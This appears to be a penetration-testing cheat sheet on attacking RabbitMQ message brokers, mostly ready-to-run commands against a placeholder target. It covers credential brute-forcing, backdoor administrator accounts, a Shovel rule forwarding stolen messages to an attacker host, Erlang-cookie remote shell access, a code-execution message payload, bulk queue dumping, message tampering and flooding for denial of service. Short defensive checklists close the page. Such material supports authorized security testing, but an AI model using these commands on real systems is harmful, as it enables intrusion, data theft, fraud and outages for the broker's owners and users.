# RabbitMQ

**`Default Ports: 5672 (AMQP), 15672 (Management UI), 25672 (Clustering)`**

**RabbitMQ** is an open-source message broker software that implements the Advanced Message Queuing Protocol (AMQP). It facilitates communication between distributed applications by routing and queuing messages. RabbitMQ is widely used in microservices architectures and can expose sensitive data if misconfigured.

### Connect <a href="#connect" id="connect"></a>

#### Using Web Management Interface <a href="#using-web-management-interface" id="using-web-management-interface"></a>

```
# Access management UI
http://target.com:15672
https://target.com:15672

# Default credentials
guest:guest (only works on localhost by default)

# Login with credentials
Username: admin
Password: password
```

#### Using rabbitmqadmin CLI <a href="#using-rabbitmqadmin-cli" id="using-rabbitmqadmin-cli"></a>

```
# Install rabbitmqadmin
wget http://target.com:15672/cli/rabbitmqadmin
chmod +x rabbitmqadmin

# List queues
./rabbitmqadmin -H target.com -u admin -p password list queues

# List exchanges
./rabbitmqadmin -H target.com -u admin -p password list exchanges

# List bindings
./rabbitmqadmin -H target.com -u admin -p password list bindings

# Get messages
./rabbitmqadmin -H target.com -u admin -p password get queue=queue_name
```

#### Using Python (pika library) <a href="#using-python-pika-library" id="using-python-pika-library"></a>

```
import pika

# Connect to RabbitMQ
credentials = pika.PlainCredentials('admin', 'password')
parameters = pika.ConnectionParameters(
    'target.com',
    5672,
    '/',
    credentials
)
connection = pika.BlockingConnection(parameters)
channel = connection.channel()

# Declare queue
channel.queue_declare(queue='test')

# Publish message
channel.basic_publish(exchange='', routing_key='test', body='Hello')

# Consume message
method, properties, body = channel.basic_get(queue='test')
print(body)

connection.close()
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use Nmap to detect RabbitMQ services and identify server capabilities.

```
nmap -p 5672,15672,25672 target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Connect to RabbitMQ services to gather version and service information.

```
# Management API
curl http://target.com:15672/api/

# Get cluster name
curl -u guest:guest http://target.com:15672/api/cluster-name

# Get overview
curl -u guest:guest http://target.com:15672/api/overview

# Check if authentication is required
curl http://target.com:15672/api/whoami
```

#### Version Detection <a href="#version-detection" id="version-detection"></a>

Extract RabbitMQ version information from various sources.

```
# Get version from management API
curl -u admin:password http://target.com:15672/api/overview | jq .rabbitmq_version

# From login page
curl -s http://target.com:15672/ | grep -i "rabbitmq"

# From error pages
curl http://target.com:15672/nonexistent
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

#### User Enumeration <a href="#user-enumeration" id="user-enumeration"></a>

Discover RabbitMQ users and their permissions.

```
# List users (requires admin)
curl -u admin:password http://target.com:15672/api/users

# Get current user
curl -u admin:password http://target.com:15672/api/whoami

# User permissions
curl -u admin:password http://target.com:15672/api/users/username/permissions

# Using rabbitmqadmin
./rabbitmqadmin -H target.com -u admin -p password list users
```

#### Queue Enumeration <a href="#queue-enumeration" id="queue-enumeration"></a>

Explore RabbitMQ queues and their contents.

```
# List all queues
curl -u admin:password http://target.com:15672/api/queues

# Queue details
curl -u admin:password http://target.com:15672/api/queues/%2F/queue_name

# Messages in queue
curl -u admin:password http://target.com:15672/api/queues/%2F/queue_name/get \
  -X POST -d '{"count":10,"ackmode":"ack_requeue_false","encoding":"auto"}'

# Using rabbitmqadmin
./rabbitmqadmin -H target.com -u admin -p password list queues \
  name messages consumers
```

#### Exchange Enumeration <a href="#exchange-enumeration" id="exchange-enumeration"></a>

Discover RabbitMQ exchanges and their bindings.

```
# List exchanges
curl -u admin:password http://target.com:15672/api/exchanges

# Exchange details
curl -u admin:password http://target.com:15672/api/exchanges/%2F/amq.direct

# Bindings
curl -u admin:password http://target.com:15672/api/bindings

# Using rabbitmqadmin
./rabbitmqadmin -H target.com -u admin -p password list exchanges
```

#### Virtual Host Enumeration <a href="#virtual-host-enumeration" id="virtual-host-enumeration"></a>

Discover RabbitMQ virtual hosts and their configurations.

```
# List vhosts
curl -u admin:password http://target.com:15672/api/vhosts

# Vhost permissions
curl -u admin:password http://target.com:15672/api/vhosts/%2F/permissions

# Using rabbitmqadmin
./rabbitmqadmin -H target.com -u admin -p password list vhosts
```

#### Connection and Channel Info <a href="#connection-and-channel-info" id="connection-and-channel-info"></a>

Monitor active connections and channels.

```
# Active connections
curl -u admin:password http://target.com:15672/api/connections

# Active channels
curl -u admin:password http://target.com:15672/api/channels

# Consumers
curl -u admin:password http://target.com:15672/api/consumers

# Using rabbitmqadmin
./rabbitmqadmin -H target.com -u admin -p password list connections
./rabbitmqadmin -H target.com -u admin -p password list channels
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

#### Default Credentials <a href="#default-credentials" id="default-credentials"></a>

RabbitMQ installations often retain default credentials for system accounts.

```
# Common default credentials
guest:guest  # Only works on localhost by default
admin:admin
administrator:administrator
user:user
test:test

# Try with curl
curl -u guest:guest http://target.com:15672/api/overview

# Check if guest account is enabled
curl -u guest:guest http://target.com:15672/api/whoami
```

#### Brute Force Attack <a href="#brute-force-attack" id="brute-force-attack"></a>

Brute forcing RabbitMQ management interface can reveal weak credentials.

**Using Hydra**

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
  target.com http-get /api/whoami:15672
```

**Using Burp Suite Intruder**

```
# Capture request to /api/whoami
# Send to Intruder
# Set Authorization header as payload position
```

**Using Custom Script**

```
for pass in $(cat passwords.txt); do
  response=$(curl -s -u admin:$pass http://target.com:15672/api/whoami)
  if [[ $response != *"401"* ]]; then
    echo "[+] Found: admin:$pass"
    break
  fi
done
```

#### Message Interception <a href="#message-interception" id="message-interception"></a>

Intercept and consume messages from RabbitMQ queues.

```
# List queues and get messages
curl -u admin:password http://target.com:15672/api/queues

# Get messages from specific queue
curl -u admin:password http://target.com:15672/api/queues/%2F/orders/get \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"count":100,"ackmode":"ack_requeue_true","encoding":"auto"}'

# Consume all messages
python3 << 'EOF'
import pika
import json

credentials = pika.PlainCredentials('admin', 'password')
connection = pika.BlockingConnection(
    pika.ConnectionParameters('target.com', 5672, '/', credentials)
)
channel = connection.channel()

def callback(ch, method, properties, body):
    print(f"Message: {body}")
    with open('messages.txt', 'a') as f:
        f.write(body.decode() + '\n')

channel.basic_consume(queue='queue_name', on_message_callback=callback, auto_ack=True)
channel.start_consuming()
EOF
```

#### Message Injection <a href="#message-injection" id="message-injection"></a>

Inject malicious messages into RabbitMQ queues.

```
# Publish malicious message to queue
curl -u admin:password http://target.com:15672/api/exchanges/%2F/amq.default/publish \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{
    "properties":{},
    "routing_key":"target_queue",
    "payload":"malicious_payload",
    "payload_encoding":"string"
  }'

# Using Python
import pika

credentials = pika.PlainCredentials('admin', 'password')
connection = pika.BlockingConnection(
    pika.ConnectionParameters('target.com', 5672, '/', credentials)
)
channel = connection.channel()

# Inject code execution payload (if consumer processes unsafely)
payload = '{"cmd":"__import__(\'os\').system(\'whoami\')"}'
channel.basic_publish(exchange='', routing_key='tasks', body=payload)
```

#### User Creation and Privilege Escalation <a href="#user-creation-and-privilege-escalation" id="user-creation-and-privilege-escalation"></a>

Create new users and escalate privileges in RabbitMQ.

```
# Create new admin user
curl -u admin:password http://target.com:15672/api/users/backdoor \
  -X PUT \
  -H "Content-Type: application/json" \
  -d '{"password":"P@ssw0rd123!","tags":"administrator"}'

# Set permissions
curl -u admin:password http://target.com:15672/api/permissions/%2F/backdoor \
  -X PUT \
  -H "Content-Type: application/json" \
  -d '{"configure":".*","write":".*","read":".*"}'

# Using rabbitmqadmin
./rabbitmqadmin -H target.com -u admin -p password declare user \
  name=backdoor password=P@ssw0rd123! tags=administrator
```

#### Shovel Plugin Abuse <a href="#shovel-plugin-abuse" id="shovel-plugin-abuse"></a>

Exploit RabbitMQ Shovel plugin for message forwarding.

```
# If shovel plugin is enabled, can forward messages
curl -u admin:password http://target.com:15672/api/parameters/shovel/%2F/my-shovel \
  -X PUT \
  -H "Content-Type: application/json" \
  -d '{
    "value": {
      "src-uri": "amqp://target.com",
      "src-queue": "source_queue",
      "dest-uri": "amqp://attacker.com",
      "dest-queue": "stolen_messages"
    }
  }'

# All messages from source_queue will be forwarded to attacker's RabbitMQ
```

#### Erlang Cookie Exploitation <a href="#erlang-cookie-exploitation" id="erlang-cookie-exploitation"></a>

Exploit Erlang cookie for direct node access.

```
# If Erlang cookie is known or found
# Cookie located at: ~/.erlang.cookie or /var/lib/rabbitmq/.erlang.cookie

# Connect to Erlang node
erl -name attacker@attacker-host -setcookie COOKIE -remsh rabbit@target-host

# Execute Erlang commands
# List users
rabbit_auth_backend_internal:list_users().

# Add user
rabbit_auth_backend_internal:add_user(<<"backdoor">>, <<"password">>).

# Set admin tag
rabbit_auth_backend_internal:set_tags(<<"backdoor">>, [administrator]).
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extract sensitive data from RabbitMQ systems.

```
# Export all queues and messages
for queue in $(curl -s -u admin:password http://target.com:15672/api/queues | jq -r '.[].name'); do
  echo "[+] Dumping queue: $queue"
  curl -u admin:password http://target.com:15672/api/queues/%2F/$queue/get \
    -X POST \
    -d '{"count":1000,"ackmode":"ack_requeue_true","encoding":"auto"}' \
    > ${queue}_messages.json
done

# Export configuration
curl -u admin:password http://target.com:15672/api/definitions > rabbitmq_config.json

# Export users and permissions
curl -u admin:password http://target.com:15672/api/users > users.json
curl -u admin:password http://target.com:15672/api/permissions > permissions.json
```

#### Persistence <a href="#persistence" id="persistence"></a>

Create persistent backdoor access to RabbitMQ systems.

```
# Create backdoor user with admin privileges
curl -u admin:password http://target.com:15672/api/users/system-monitor \
  -X PUT \
  -d '{"password":"ComplexP@ss123!","tags":"administrator"}'

# Set full permissions
curl -u admin:password http://target.com:15672/api/permissions/%2F/system-monitor \
  -X PUT \
  -d '{"configure":".*","write":".*","read":".*"}'

# Create hidden queue for C2
curl -u admin:password http://target.com:15672/api/queues/%2F/.system \
  -X PUT \
  -d '{"durable":true}'
```

#### Message Manipulation <a href="#message-manipulation" id="message-manipulation"></a>

Modify messages in RabbitMQ queues for malicious purposes.

```
# Modify messages in queue (requires draining and republishing)
# Get messages
messages=$(curl -u admin:password http://target.com:15672/api/queues/%2F/orders/get \
  -X POST -d '{"count":100,"ackmode":"ack_requeue_false","encoding":"auto"}')

# Modify and republish
echo "$messages" | jq -c '.[]' | while read msg; do
  # Modify message (e.g., change prices, quantities, etc.)
  modified=$(echo "$msg" | jq '.payload = "modified_payload"')
  
  # Republish
  curl -u admin:password http://target.com:15672/api/exchanges/%2F/amq.default/publish \
    -X POST -d "$modified"
done
```

#### Denial of Service <a href="#denial-of-service" id="denial-of-service"></a>

Perform denial of service attacks against RabbitMQ systems.

```
# Flood queue with messages
for i in {1..100000}; do
  curl -u admin:password http://target.com:15672/api/exchanges/%2F/amq.default/publish \
    -X POST \
    -d "{\"routing_key\":\"target_queue\",\"payload\":\"DoS_$i\",\"payload_encoding\":\"string\"}"
done

# Create resource-intensive bindings
for i in {1..1000}; do
  curl -u admin:password http://target.com:15672/api/bindings/%2F/e/exchange/q/queue \
    -X POST -d "{\"routing_key\":\"key_$i\"}"
done

# Exhaust disk space with persistent messages
curl -u admin:password http://target.com:15672/api/queues/%2F/disk-filler \
  -X PUT -d '{"durable":true}'
```

### Common RabbitMQ API Endpoints <a href="#common-rabbitmq-api-endpoints" id="common-rabbitmq-api-endpoints"></a>

| Endpoint           | Method | Description          | Auth Required |
| ------------------ | ------ | -------------------- | ------------- |
| `/api/overview`    | GET    | Server overview      | Yes           |
| `/api/whoami`      | GET    | Current user info    | Yes           |
| `/api/users`       | GET    | List users           | Admin         |
| `/api/queues`      | GET    | List queues          | Yes           |
| `/api/exchanges`   | GET    | List exchanges       | Yes           |
| `/api/bindings`    | GET    | List bindings        | Yes           |
| `/api/vhosts`      | GET    | List virtual hosts   | Yes           |
| `/api/connections` | GET    | List connections     | Admin         |
| `/api/definitions` | GET    | Export configuration | Admin         |

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool          | Description            | Primary Use Case          |
| ------------- | ---------------------- | ------------------------- |
| rabbitmqadmin | Official CLI tool      | Management and automation |
| pika          | Python AMQP library    | Programmatic access       |
| curl          | HTTP client            | API interaction           |
| Burp Suite    | Web proxy              | API testing               |
| Nmap          | Network scanner        | Service detection         |
| Metasploit    | Exploitation framework | Automated testing         |

### Security Misconfigurations to Test <a href="#security-misconfigurations-to-test" id="security-misconfigurations-to-test"></a>

* ❌ Default credentials (guest:guest)
* ❌ Weak admin passwords
* ❌ Management interface exposed to internet
* ❌ No TLS/SSL encryption
* ❌ Guest account enabled remotely
* ❌ Overly permissive user permissions
* ❌ No authentication on AMQP port (5672)
* ❌ Erlang cookie exposed or weak
* ❌ Shovel/Federation plugins misconfigured
* ❌ No rate limiting on message publishing
* ❌ Sensitive data in messages
* ❌ No message encryption
* ❌ Verbose error messages
* ❌ Outdated RabbitMQ version

### Message Queue Security Best Practices <a href="#message-queue-security-best-practices" id="message-queue-security-best-practices"></a>

* ✅ Change default credentials
* ✅ Use strong passwords for all users
* ✅ Implement TLS/SSL encryption
* ✅ Disable guest account for remote access
* ✅ Use principle of least privilege
* ✅ Enable authentication on all ports
* ✅ Protect Erlang cookie
* ✅ Regularly update RabbitMQ
* ✅ Implement message encryption
* ✅ Monitor and log access
* ✅ Use virtual hosts for isolation
* ✅ Implement rate limiting
* ✅ Validate and sanitize message content
* ✅ Restrict management interface access
